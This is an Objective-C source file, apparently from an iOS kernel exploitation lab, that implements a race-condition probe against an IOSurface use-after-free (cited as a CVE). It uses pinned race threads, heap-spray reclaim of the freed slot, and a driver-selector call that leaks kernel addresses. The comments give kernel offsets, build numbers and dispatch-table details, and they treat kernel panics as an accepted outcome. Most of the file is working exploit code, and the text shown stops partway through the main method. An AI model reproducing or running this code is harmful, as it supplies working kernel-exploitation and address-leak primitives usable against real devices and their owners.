//
//  P110SurfaceSwapClaim.m — IOSurface swap-claim probe (design 270).
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  CVE-2026-112477: the IOSurface detach-then-set (23F77 0xfffffff00985fbb8 /
//  24A435 0xa33ac74) and the destroy twin (23F77 0x985fc70) both act on
//  [surface+0x30] with zero locks: release the old client (vtbl+0xe0), then
//  the setter swaps in a kernel-constructed client and immediately derefs
//  its [new+0] vtable pointer under the autda(0xcda1|objaddr) law before the
//  vt+0x48 consumer body runs (++[p+0xc], ++[p+0x10], [this+0x3c0]|=0x1c —
//  24A435 flags at +0x3d0, bit10 unchanged). Between the release and the
//  consumer deref the freed client slot is reclaimable ONLY by a genuine
//  live IOSurface-class object (the autda modifier is address-bound; attacker
//  content NEVER passes — that outcome is the Family-B far
//  0x0020000000000048 auth-poison panic class).
//
//  User-influence law (note 270 §1): every pointer that lands in
//  [surface+0x30] is kernel-constructed. The user shapes WHICH sibling
//  session provides the client and WHEN its owner dies. The user drives the
//  standard external-method request per call through the framework's
//  IOSurface APIs, which dispatch the IOSurfaceRoot sMethods rows
//  (23F77 0xfffffff007f33888 / 24A435 0xfffffe000837fa10; row 0 == row 60 =
//  the create-attach wrapper chain ending in the sibling-swap engine +
//  setter). The probe NEVER hardcodes kernel VAs — offsets stay in
//  LabIntelOffsets rows; all evidence is behavioral.
//
//  v1 session-shape honesty: the dlsym framework law drives ONE IOSurface
//  session per process (the framework's own root user client). A true
//  SECOND IOSurfaceRoot UC (IOServiceOpen + raw sel-0 create-attach) is the
//  next-build raw-sel arm — the row's sin/col sizes are not pinned in the
//  intel rows yet, and this rig does not fire guessed struct sizes. The
//  pop law (prefill(6)+2, same CPU) runs against the kext's own
//  kalloc-type client sites via the framework create path — the only
//  auth-passing claim class per note 270 §2b/c.
//
//  v2 LEAK-GATE (this build): the claim law's own KVA-disclosure pairing —
//  the M2ScalerCSCDriver selector-8 (iosaDiag) leak capture runs as the
//  round's LEAK STAGE so the claim window can be PAIRED against a leak
//  snapshot. Derived law (all from LabIntelOffsets rows, never hardcoded):
//    - m2scaler.get_iosaDiag_sel (PROVEN-EXT): sel 8; the event_payload +0x18
//      field leaks an IOSurface KVA — iOS<=26.5.2 live on 23F77, fixed 26.6
//      (23G71), likely CVE-2026-64709.
//    - t8150.m2scaler.leak8: the fn's own gate is cmp x2,#8 — the struct
//      input is {u64} 8 BYTES (NOT p098's 16-byte {userVA,size} shape — that
//      was the v5 run-failer); 23F77 twin 0x8a32040.
//    - t8150.m2scaler.serializer: the OUT = the activity-queue serializer's
//      records: +0x20 header, record stride 0x7c, and rec+0x18 =
//      str x8,[x0,#0x18] — the RAW first-event qword passthrough, NO auth =
//      the KVA disclosure class.
//    - t8150.m2scaler.client30: one recorder site stores a +0x30-shaped
//      client-ptr ([obj+0x1f10]+0x30-class list node) — the claim law's own
//      [surface+0x30] field shape, so rec+0x30-class KV changes across the
//      swap window are the claim-corruption observable.
//  Honest classification: leaked KVs print as LAW: KVA DISCLOSURE CLASS —
//  not kread; the honesty line is mandatory in every print that carries a
//  leaked KV; hasKread=NO stays until a kread32-class receipt exists. If
//  the out shape mismatches (kext version drift), the probe prints the
//  hexdump honestly and HOLDs the pairing.
//
//  v2 bandit arms (LabBandit shared ledger): the four v1.2 race-shape arms
//  are joined by the p110 domain arm pair leakgate-on / leakgate-off. On
//  leakgate-on the leak stage runs pre-round (per-round pre/post snapshots;
//  the IN FLIGHT stamp carries the leak-record count as the round's
//  pre-window state; a claim-won round prints the claim-window leak DIFF —
//  the +0x30-class KV changes = the claim-corruption observable, labeled
//  proxy-class: names the objects, proves the corruption CLASS, no kread
//  claim). On leakgate-off the tap is pure v1.2. The bandit learns whether
//  leak-gating changes the claim rate.
//
//  PANIC RISK: accepted per lab protocol (Family-B IS a target outcome).
//  Every round is fsync-marked BEFORE arming, so a post-panic reboot's
//  p110_swapclaim_log.txt names the in-flight round unambiguously.
//  STANDALONE TAP ONLY — never in the PATCH chain (AGENTS.md rule 9).
//  The M2Scaler door is left OPEN for the process lifetime on leakgate-on
//  (the P027/P098 delayed-teardown fault class fires ~1-2 s AFTER a door
//  close — never closing it never arms that class; one tap per force-quit).
//

#import "P110SurfaceSwapClaim.h"
#import "LabDeviceProfile.h"
#import "LabIntelOffsets.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "LabRuntimeOffsets.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <pthread.h>
#import <signal.h>
#import <sched.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdatomic.h>
#import <mach/mach.h>
#import <mach/thread_policy.h>
#import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
#import <sys/qos.h>

#define P110_BUILD      @"p110-swapclaim-v2.1-leakgate-qfa8"
#define P110_ROUNDS     64
#define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
#define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
#define P110_POP        2       /* fresh creates popped AT the window        */
#define P110_DIAL_MAX   20000   /* ns spin cap for the 267 v10 dial law    */
#define P110_GO_TIMEOUT_MS 2000 /* bounded: one window per round           */

/* ---- v2 leak-gate constants (the derived M2ScalerCSC sel-8 law) --------- */
#define P110_LEAK_HDR     0x20     /* serializer out header before rec 0    */
#define P110_LEAK_STRIDE  0x7c     /* record stride (the serializer law)    */
#define P110_LEAK_KV18    0x18     /* rec+0x18 = RAW qword passthrough      */
#define P110_LEAK_KV30    0x30     /* rec+0x30 = +0x30-class client-ptr     */
#define P110_LEAK_SNAP    16       /* records held per snapshot             */
#define P110_LEAK_OUT_MAX 0x10000  /* driver alloc (w+w9)*0x7c+0x20 cover   */
#define P110_LEAK_PRINT   8        /* per-capture record print cap          */

/* ---- framework types: dlsym only, never <IOSurface/IOSurface.h> ------- */
typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef IOSurfaceRef (*IOSurfaceLookup_t)(uint32_t);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef void * (*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef int64_t (*IOSurfaceGetAllocSize_t)(IOSurfaceRef);

/* ---- dlsym'd function pointers ---------------------------------------- */
static IOSurfaceCreate_t         g_create;
static IOSurfaceLookup_t         g_lookup;
static IOSurfaceGetID_t          g_getid;
static IOSurfaceGetBaseAddress_t g_base;
static IOSurfaceGetAllocSize_t   g_alloc;
static void (*g_release)(IOSurfaceRef);   /* IOSurfaceRelease or CFRelease */

/* ---- v2 leak-gate: M2ScalerCSC sel-8 door state + snapshot type --------- */
typedef struct {
    int      n;                       /* records captured (capped at SNAP)   */
    int      recs;                    /* derived record count from outLen    */
    int      kv;                      /* KVA-disclosure-class count          */
    uint64_t kv18[P110_LEAK_SNAP];    /* rec+0x18 raw passthrough values     */
    uint64_t kv30[P110_LEAK_SNAP];    /* rec+0x30-class client-ptr values    */
} P110LeakSnap;

static P110LeakSnap g_p110_snap_pre, g_p110_snap_post;
static BOOL g_p110_leakgate;          /* bandit arm 4 (leakgate-on)          */
static BOOL g_p110_leak_ok;           /* shape confirmed at the validation capture */
static int  g_p110_leak_recs;         /* pre-window record count (IN FLIGHT stamp) */
static int  g_p110_leak_caps;         /* sel-8 captures this tap             */
static int  g_p110_leak_pairs;        /* claim-window DIFFs printed          */
static uint8_t g_p110_leak_out[P110_LEAK_OUT_MAX];   /* serializer out buffer  */

/* IOKit via dlsym only (AGENTS landmine: no macOS-only headers; IOKitLib
   symbols resolved at runtime like the p098 sibling)                    */
typedef CFMutableDictionaryRef (*p110_IOMatching_t)(const char *);
typedef io_service_t (*p110_IOGetSVC_t)(mach_port_t, CFDictionaryRef);
static p110_IOMatching_t  g_p110_match;
static p110_IOGetSVC_t    g_p110_getsvc;
static kern_return_t (*g_p110_open)(io_service_t, task_port_t, uint32_t, io_connect_t *);
static IOReturn (*g_p110_callStruct)(mach_port_t, uint32_t, const void *, size_t,
                                     void *, size_t *);
static IOReturn (*g_p110_objRelease)(io_object_t);
static io_service_t g_p110_m2svc;
static io_connect_t g_p110_m2conn;
static BOOL g_p110_m2queued;
static uint64_t g_p110_m2qh;          /* queue-create out q0 (best-effort)   */

/* ---- run state --------------------------------------------------------- */
static int      g_fd = -1;
static bool     g_run = false;
static volatile int g_gate = 0;          /* 0 idle, 1 = race threads fire  */
static volatile int g_round;

/* per-round mailbox (written by the main thread, consumed by racers)      */
static IOSurfaceRef g_e_target;           /* T_engine: A-ref to drop        */
static IOSurfaceRef g_d_target;           /* T_destroy: prior sibling ref   */
static uint32_t     g_d_sid;
static IOSurfaceRef g_pop[P110_POP];
static uint32_t     g_pop_sid[P110_POP];
static volatile long g_dial;              /* ns spin between D and the pop  */
static volatile int g_d_probe_alive;      /* post-ownership sid resolvable? */

/* thread completion states */
#define TST_NONE 0
#define TST_DONE 1
static volatile int g_st_e, g_st_d, g_st_p;
static volatile int g_park_e, g_park_d, g_park_p;  /* back-at-idle flags    */

/* verdict counters — v1.1 SPLIT: the session counters reset at tap start (the
   12:06-round bug: the v1 verdict printed the process-lifetime accumulated
   counts (113) under the session shape, because +tap is a class method over
   file statics that live for the whole process). The _proc counters keep
   accumulating across taps for the process-totals verdict line. */
static atomic_int v_win_lost;
static atomic_int v_family_b;             /* in-process fault only          */
static atomic_int v_claim_won;
static atomic_int v_aborted;
static atomic_int v_win_lost_proc;
static atomic_int v_family_b_proc;
static atomic_int v_claim_won_proc;
static atomic_int v_aborted_proc;

static NSMutableString *g_log = nil;

/* ---- v2 bandit (LabBandit shared harness): one pick per tap -----------------
   v1.2 arms span the three race-shape knobs ALREADY in this file — no new race
   shapes (LabBandit law: arms = existing code paths, trivially gated). The
   rounds inside one tap share it; the shared ledger
   (Documents/lab_bandit.json) learns across reboot cycles on both SKUs.
     0 "p6-dial0-popwin"   : prefill 6, dial pinned 0ns, +2 pop in-window
     1 "p6-b200-popwin"    : prefill 6, the +200ns exponential bump law
                             (the v1.1 shipped law — one slot per lost round)
     2 "p8-b200-popwin"    : prefill 8, the +200ns bump law
     3 "p6-dial0-popearly" : prefill 6, dial 0, the SAME +2 fresh creates
                             issued EARLY pre-window (pop-timing calibration)
     4 "leakgate-on"       : the v2 leak stage runs pre-round — the
                             M2ScalerCSC sel-8 capture per round (pre/post
                             snapshots; IN FLIGHT carries the leak-record
                             count; claim-won prints the claim-window leak
                             DIFF, the +0x30-class KV-change observable);
                             race shape = the v1.2 law untouched
     5 "leakgate-off"      : pure v1.2 (no leak stage) — the bandit learns
                             whether leak-gating changes the claim rate
   Outcomes = the existing (a)/(b)/(c) words on the shared reward map:
   window-lost / family-b / claim-won (+ "abort" = the bounded re-park /
   unwind stops). The (b) class is recorded by LabBandit's dirty-boot
   attribution: a PROVEN kern.boottime change on an open round = the device
   panicked on the IN FLIGHT line = the attested Family-B class; the same
   boot = the in-process SIGBUS/EFAULT-class (b) catch killed the process
   (the only exit that leaves the round open; a force-quit looks identical —
   the log's handler line names the round). */
static const char *const g_p110_arms[6] = {
    "p6-dial0-popwin", "p6-b200-popwin", "p8-b200-popwin", "p6-dial0-popearly",
    "leakgate-on", "leakgate-off"
};
static int  g_p110_arm;                       /* one arm per tap             */
static int  g_p110_prefillN = P110_PREFILL_DEF;
static BOOL g_p110_dialBase0;                 /* arms 0/3: the dial stays 0  */
static BOOL g_p110_popEarly;                  /* arm 3: +2 pop pre-window    */
static BOOL g_p110_leakStage;                 /* arms 4: the leak stage runs */
static const LabBanditSeedRow g_p110_seeds[] = {
    /* documented p110 claim-oracle history, approximate and honestly
       labeled by the seeded_from string: the v1/v1.1 ledger note — 113
       accumulated process-lifetime window counts under the v1 shape
       (= this arm). Other arms have no documented rounds; zero seeds. */
    { "p6-b200-popwin", "window-lost", 113 },
};
static void p110_arm_apply(void) {
    g_p110_prefillN = P110_PREFILL_DEF;
    g_p110_dialBase0 = NO;
    g_p110_popEarly = NO;
    g_p110_leakStage = NO;
    switch (g_p110_arm) {
        case 0: g_p110_dialBase0 = YES; break;
        case 2: g_p110_prefillN = 8; break;
        case 3: g_p110_dialBase0 = YES; g_p110_popEarly = YES; break;
        case 4: g_p110_leakStage = YES; break;   /* leakgate-on: v1.2 race law
                                                    + the sel-8 leak stage     */
        default: break;   /* cases 1/5 = the v1.2 law verbatim (5 = pure) */
    }
    g_p110_leakgate = g_p110_leakStage;
}

/* ---- fsync log: every line hits disk before the probe continues -------- */
static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) {
            (void)write(g_fd, p, strlen(p));
            (void)fcntl(g_fd, F_FULLFSYNC);
        }
    }
}

static void Lf(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* ---- same-CPU law: all three race threads share one affinity tag ------- */
static void p110_pin(void) {
    thread_affinity_policy_data_t aff;
    aff.affinity_tag = 1;
    (void)thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&aff, THREAD_AFFINITY_POLICY_COUNT);
    (void)pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
}

/* ---- (b) in-process Family-B catch: async-signal-safe honest verdict --- */
static void p110_sigfault(int sig, siginfo_t *si, void *ctx) {
    /* A kernel-side autda death never reaches us (device reboots); this
       catches the SIGBUS/EFAULT-class alias-path fault in OUR process =
       design outcome (b): window WON, free slot. Honest print, no
       success claim. Async-signal-safe writes only (no ObjC).           */
    (void)si; (void)ctx;
    int fd = g_fd;
    static const char msg1[] =
        "[r in-flight] OUTCOME (b) FAMILY-B-SHAPED FAULT IN PROCESS — window WON, "
        "free slot (SIGBUS/EFAULT-class on the alias path). Honest print, no success claim.\n";
    static const char msg2[] =
        "=== p110 ended on a userspace alias-path fault (design outcome b). "
        "Re-tap law: one tap per force-quit. ===\n";
    if (fd >= 0) {
        (void)write(fd, msg1, sizeof(msg1) - 1);
        (void)write(fd, msg2, sizeof(msg2) - 1);
    }
    (void)signal(sig, SIG_DFL);
    (void)raise(sig);
}

/* ---- surface helpers ---------------------------------------------------- */
static CFDictionaryRef p110_mkprops(void) {
    int64_t sz = 0x1000, w = 64, h = 4, bpe = 4, bpr = 0x100;
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef n;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sz);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &w);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &h);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &bpe);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &bpr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), n); CFRelease(n);
    return d;
}

static IOSurfaceRef p110_create(uint32_t *sid_out) {
    CFDictionaryRef d = p110_mkprops();
    IOSurfaceRef s = g_create ? g_create(d) : NULL;
    CFRelease(d);
    if (sid_out) *sid_out = (s && g_getid) ? g_getid(s) : 0;
    return s;
}

static kern_return_t p110_release(IOSurfaceRef s) {
    if (!s) return KERN_INVALID_ARGUMENT;
    if (g_release) { g_release(s); return KERN_SUCCESS; }
    return KERN_FAILURE;
}

/* marker byte law: one byte written at sibling-attach time and re-read
   through the sibling ref AFTER the owner release — divergence is the
   alias-path evidence class.                                              */
#define P110_MARKER 0xA7

/* ---- race threads (D-thread shape; all pinned to one CPU, tag 1) ------- */
static void *p110_t_engine(void *arg) {
    (void)arg;
    p110_pin();
    while (g_run) {
        g_park_e = 1;
        __sync_synchronize();
        while (g_run && !g_gate) { sched_yield(); }
        g_park_e = 0;
        __sync_synchronize();
        if (!g_run) break;
        IOSurfaceRef t = g_e_target;
        if (t) { (void)p110_release(t); }   /* owner-death release (detacher
                                               half of the window)           */
        g_e_target = NULL;
        __sync_synchronize();
        g_st_e = TST_DONE;
        while (g_run && g_gate) { sched_yield(); }
    }
    return NULL;
}

static void *p110_t_destroy(void *arg) {
    (void)arg;
    p110_pin();
    while (g_run) {
        g_park_d = 1;
        __sync_synchronize();
        while (g_run && !g_gate) { sched_yield(); }
        g_park_d = 0;
        __sync_synchronize();
        if (!g_run) break;
        IOSurfaceRef t = g_d_target;
        uint32_t sid = g_d_sid;
        kern_return_t kr = p110_release(t);    /* destroy-twin class path    */
        int alive = -1;
        if (t && g_lookup) {
            /* honest window probe: is the fully released sid resolvable?   */
            IOSurfaceRef probe = g_lookup(sid);
            alive = probe ? 1 : 0;
            if (probe) p110_release(probe);
            (void)kr;
        }
        g_d_probe_alive = alive;
        g_d_target = NULL;
        __sync_synchronize();
        g_st_d = TST_DONE;
        while (g_run && g_gate) { sched_yield(); }
    }
    return NULL;
}

static void *p110_t_reclaim(void *arg) {
    (void)arg;
    p110_pin();
    while (g_run) {
        g_park_p = 1;
        __sync_synchronize();
        while (g_run && !g_gate) { sched_yield(); }
        g_park_p = 0;
        __sync_synchronize();
        if (!g_run) break;
        /* the dial: bounded ns spin on THIS cpu between the owner-release
           and the +2 pop — the 267 v10 one-slot calibration law           */
        long d = g_dial;
        for (volatile long i = 0; i < d; i++) { }
        /* bandit arm 3 (popearly): the +2 fresh creates were ALREADY issued
           pre-window by the tap thread — this thread returns idle so the
           window shape (engine/destroy releases) is unchanged             */
        if (!g_p110_popEarly) {
            for (int i = 0; i < P110_POP; i++) {
                uint32_t sid = 0;
                g_pop[i] = p110_create(&sid);   /* genuine IOSurface-class alloc */
                g_pop_sid[i] = sid;             /* into the kext zalloc sites    */
            }
        }
        __sync_synchronize();
        g_st_p = TST_DONE;
        while (g_run && g_gate) { sched_yield(); }
    }
    return NULL;
}

/* ---- v2 LEAK STAGE: M2ScalerCSC selector 8 (the derived leak law) --------
   Every kernel-range KV printed anywhere below is evidence in the LAW: KVA
   DISCLOSURE CLASS — not kread; hasKread=NO until a kread32-class receipt
   exists. The out shape is TOLERATED: on kext version drift the hexdump is
   printed honestly and the pairing HELDs (race rounds continue unpaired). */

static mach_port_t g_p110_main;       /* kIOMainPortDefault value            */

static BOOL p110_kernelish(uint64_t v) {
    return (v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFF000000000ULL) ||
           (v >= 0xFFFFFFF000000000ULL);
}

static BOOL p110_leak_iosyms(void) {
    if (g_p110_match) return YES;
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
    if (!iokit) iokit = RTLD_DEFAULT;
    g_p110_match      = (p110_IOMatching_t)dlsym(iokit, "IOServiceMatching");
    g_p110_getsvc     = (p110_IOGetSVC_t)dlsym(iokit, "IOServiceGetMatchingService");
    g_p110_open       = (kern_return_t (*)(io_service_t, task_port_t, uint32_t, io_connect_t *))dlsym(iokit, "IOServiceOpen");
    g_p110_callStruct = (IOReturn (*)(mach_port_t, uint32_t, const void *, size_t, void *, size_t *))dlsym(iokit, "IOConnectCallStructMethod");
    g_p110_objRelease = (IOReturn (*)(io_object_t))dlsym(iokit, "IOObjectRelease");
    mach_port_t (*pm)(void) = (mach_port_t (*)(void))dlsym(iokit, "kIOMainPortDefault");
    if (pm) g_p110_main = *(volatile mach_port_t *)pm;
    return g_p110_match && g_p110_getsvc && g_p110_open && g_p110_callStruct;
}

/* door open: IOServiceOpen AppleM2ScalerCSCDriver type 0, once per tap.
   The door is NEVER closed on this tap (P027/P098 law: the delayed async
   teardown fault fires ~1-2 s AFTER a close — never closing never arms it;
   one tap per force-quit).                                            */
static BOOL p110_leak_door(void) {
    if (g_p110_m2conn) return YES;
    if (!p110_leak_iosyms()) {
        L(@"[leak] IOKit dlsym incomplete — leak stage HOLDs, race continues");
        return NO;
    }
    CFMutableDictionaryRef m = g_p110_match("AppleM2ScalerCSCDriver");
    io_service_t svc = m ? g_p110_getsvc(g_p110_main, m) : 0;
    if (!svc) {
        L(@"[leak] AppleM2ScalerCSCDriver service not present on this boot — "
          @"leak stage HOLDs, race continues (honest miss)");
        return NO;
    }
    g_p110_m2svc = svc;
    kern_return_t kr = g_p110_open(svc, mach_task_self(), 0, &g_p110_m2conn);
    (void)g_p110_objRelease(svc);   /* the GetMatchingService +1 ref; the
                                       door lives in the UC connection    */
    Lf(@"[leak] IOServiceOpen AppleM2ScalerCSCDriver type=0 kr=0x%x conn=%d", kr, g_p110_m2conn);
    return (kr == KERN_SUCCESS && g_p110_m2conn);
}

/* queue create (sel 6) — p098 v5 law: sel-8 with no queue on the connection
   reads zero bytes and rejects. v1.2 law (2026-10-27, byte-verified on-disk
   on BOTH builds): the M2Scaler kext's own dispatch table (12 rows, stride
   0x30, in-size at row+0x20) says sel=6 in = 0xFA8 on 23F77 AND 24A435
   (24A435 table 0xfffffe00080efcd8). The LabOff queue_create_size row is the
   IOGPU queue (0x410/0x408), NOT M2Scaler — the 21:54 17-side run proved it
   (stIn=0x408 -> 2c2 with open conn=61699). */
static void p110_leak_queue(void) {
    if (g_p110_m2queued || !g_p110_m2conn) return;
    g_p110_m2queued = YES;
    uint32_t qsz = 0xFA8u;
    static uint8_t qBuf[0xFA8];
    memset(qBuf, 0, sizeof(qBuf));
    size_t qOutLen = sizeof(qBuf);
    uint64_t qOut[4] = {0};
    kern_return_t krQ = g_p110_callStruct(g_p110_m2conn, 6, qBuf, qsz, qOut, &qOutLen);
    g_p110_m2qh = qOut[0];
    Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (M2Scaler dispatch row law: 0xfa8 on BOTH "
       @"23F77 + 24A435, byte-verified at table 0xfffffe00080efcd8 sel-6) zeros "
       @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
       qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
}

static void p110_leak_hexdump(size_t maxn) {
    size_t len = P110_LEAK_OUT_MAX < maxn ? P110_LEAK_OUT_MAX : maxn;
    for (size_t row = 0; row < len; row += 16) {
        NSMutableString *hex = [NSMutableString string];
        for (size_t i = 0; i < 16 && row + i < len; i++)
            [hex appendFormat:@"%02x%s", g_p110_leak_out[row + i], (i == 15) ? "" : " "];
        Lf(@"[leak hexdump] +0x%04zx: %@", row, hex);
    }
}

/* one sel-8 capture. print=YES = the full KV table (the leak stage's own
   law print); print=NO = one summary line (the per-round taps).
   Returns YES only when the shape held (stride law + header present).   */
static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
    if (!snap) return NO;
    memset(snap, 0, sizeof(*snap));
    if (!p110_leak_door()) return NO;
    if (!g_p110_m2queued) p110_leak_queue();
    memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
    uint64_t in64 = g_p110_m2qh;            /* the {u64} 8-byte input law    */
    size_t outLen = sizeof(g_p110_leak_out);
    IOReturn kr = g_p110_callStruct(g_p110_m2conn, 8, &in64, sizeof(in64),
                                    g_p110_leak_out, &outLen);
    g_p110_leak_caps++;

    size_t need = P110_LEAK_HDR + P110_LEAK_STRIDE;
    if (kr != KERN_SUCCESS || outLen < need ||
        ((outLen - P110_LEAK_HDR) % P110_LEAK_STRIDE) != 0) {
        Lf(@"[leak %@] OUT SHAPE MISMATCH (tolerant law): sel=8 in={%016llx} 8B "
           @"kr=0x%08x outLen=%zu — kext version drift class; hexdump follows, "
           @"pairing HELD, race rounds continue",
           tag, (unsigned long long)in64, kr, outLen);
        p110_leak_hexdump(0x40);
        return NO;
    }
    int recs = (int)((outLen - P110_LEAK_HDR) / P110_LEAK_STRIDE);
    snap->recs = recs;
    g_p110_leak_recs = recs;
    int n = recs < P110_LEAK_SNAP ? recs : P110_LEAK_SNAP;
    snap->n = n;
    for (int i = 0; i < n; i++) {
        const uint8_t *rec = g_p110_leak_out + P110_LEAK_HDR + (size_t)i * P110_LEAK_STRIDE;
        uint64_t v18, v30;
        memcpy(&v18, rec + P110_LEAK_KV18, 8);   /* the RAW qword passthrough */
        memcpy(&v30, rec + P110_LEAK_KV30, 8);   /* the +0x30-class client-ptr */
        snap->kv18[i] = v18;
        snap->kv30[i] = v30;
        if (p110_kernelish(v18) || p110_kernelish(v30)) snap->kv++;
    }

    if (!print) {
        Lf(@"[leak %@] sel=8 in={%016llx} 8B kr=0x%x outLen=%zu recs=%d "
           @"kv-disclosure-class=%d (stride 0x7c law held)",
           tag, (unsigned long long)in64, kr, outLen, snap->recs, snap->kv);
        return YES;
    }

    /* the LEAK STAGE's own law print: the KV table + the mandatory honesty */
    Lf(@"[leak %@] sel=8 in={%016llx} 8B ({u64} input law, row sin=8; NOT p098's "
       @"16-byte {va,size} run-failer) kr=0x%x outLen=%zu -> records=%d "
       @"(header 0x20 + n*0x7c serializer law)",
       tag, (unsigned long long)in64, kr, outLen, snap->recs);
    int pmax = snap->recs < P110_LEAK_PRINT ? snap->recs : P110_LEAK_PRINT;
    for (int i = 0; i < pmax; i++) {
        Lf(@"[leak %@] rec[%d] +0x18=%016llx%s +0x30=%016llx%s",
           tag, i,
           (unsigned long long)snap->kv18[i],
           p110_kernelish(snap->kv18[i]) ? " KVA" : "",
           (unsigned long long)snap->kv30[i],
           p110_kernelish(snap->kv30[i]) ? " KVA" : "");
    }
    if (snap->recs > pmax)
        Lf(@"[leak %@] ... %d more records held in the snapshot (print cap %d)",
           tag, snap->recs - pmax, P110_LEAK_PRINT);
    if (snap->kv) {
        L(@"LAW: KVA DISCLOSURE CLASS — not kread. These KVs are the sel-8 "
          @"event_payload passthrough (rec+0x18 raw, no auth; t8150.m2scaler."
          @"serializer law) — disclosure-class evidence ONLY. hasKread=NO stays "
          @"until a kread32-class receipt exists; no success claim.");
    } else {
        L(@"[leak] no kernel-range KV in this capture's snapshot (honest null — "
          @"perm-strip, input shape, or driver drift all possible; hexdump on "
          @"mismatch only).");
    }
    return YES;
}

/* the PAIR OBSERVABLE: claim-window leak DIFF (the pre/post snapshots).
   +0x30-class KV changes = the claim-corruption observable, labeled
   proxy-class: names the objects, proves the corruption CLASS, no kread. */
static void p110_leak_diff(int r) {
    int pre  = g_p110_snap_pre .recs;
    int post = g_p110_snap_post.recs;
    int m = pre < post ? pre : post;
    int c18 = 0, c30 = 0;
    int shown = 0;
    for (int i = 0; i < m && i < g_p110_snap_pre.n; i++) {
        if (g_p110_snap_pre.kv18[i] != g_p110_snap_post.kv18[i]) c18++;
        if (g_p110_snap_pre.kv30[i] != g_p110_snap_post.kv30[i]) c30++;
    }
    Lf(@"[pair r%d] CLAIM-WINDOW LEAK DIFF (pre -> post): recs %d -> %d, "
       @"changed +0x18 KV=%d / +0x30-class KV=%d (%d records compared)",
       r, pre, post, c18, c30, m);
    for (int i = 0; i < m && i < g_p110_snap_pre.n && shown < 8; i++) {
        if (g_p110_snap_pre.kv18[i] == g_p110_snap_post.kv18[i]) continue;
        Lf(@"[pair r%d] rec[%d] +0x18 KV %016llx -> %016llx",
           r, i,
           (unsigned long long)g_p110_snap_pre.kv18[i],
           (unsigned long long)g_p110_snap_post.kv18[i]);
        shown++;
    }
    shown = 0;
    for (int i = 0; i < m && i < g_p110_snap_pre.n && shown < 8; i++) {
        if (g_p110_snap_pre.kv30[i] == g_p110_snap_post.kv30[i]) continue;
        Lf(@"[pair r%d] rec[%d] +0x30-class KV %016llx -> %016llx",
           r, i,
           (unsigned long long)g_p110_snap_pre.kv30[i],
           (unsigned long long)g_p110_snap_post.kv30[i]);
        shown++;
    }
    if (c18 || c30) {
        Lf(@"[pair r%d] OUTCOME (c) PAIR OBSERVABLE (proxy-class) — LAW: KVA "
           @"DISCLOSURE CLASS — not kread: the KV changes name the objects and "
           @"prove the corruption CLASS across the claim window (the +0x30-class "
           @"= the claim law's own [surface+0x30]-shaped client-ptr field, "
           @"t8150.m2scaler.client30 law). No kread claim; hasKread=NO stays "
           @"until a kread32-class receipt exists.", r);
    } else {
        L(@"[pair] diff clean — no KV changes across this window (honest null; "
          @"the claim evidence stays the alias/slot-reuse classes only)");
    }
}

/* ---- intel-row law resolution (never hardcoded; the probe prints the law) */
static NSString *p110_flags_law(void) {
    LabSku sku = [LabDeviceProfile detectedSku];
    const char *row = NULL;
    uint64_t computed = 0;
    if (sku == LabSkuA14_23F77)    { row = "f77_iosurf.flags_off";   computed = 0x3c0; }
    if (sku == LabSkuT8150_24A435) { row = "t8150.iosurf.flags_off"; computed = 0x3d0; }
    if (!row) {
        return @"[flags law] SKU not in the intel rows — flags law NOT resolved";
    }
    uint64_t v = LabIntelValue(row, NULL);
    if (v) {
        return [NSString stringWithFormat:
            @"[flags law] intel row %s = +%llx flags field (bit10 law unchanged) — "
            @"law source: LabIntelOffsets row",
            row, (unsigned long long)v];
    }
    return [NSString stringWithFormat:
        @"[flags law] intel row %s ABSENT — computed byte law +%llx used "
        @"(23F77 +0x3c0 / 24A435 +0x3d0, bit10 same) — law source: computed",
        row, (unsigned long long)computed];
}

@implementation P110SurfaceSwapClaim

+ (NSString *)tap {
    g_log = [NSMutableString string];
    g_run = false;
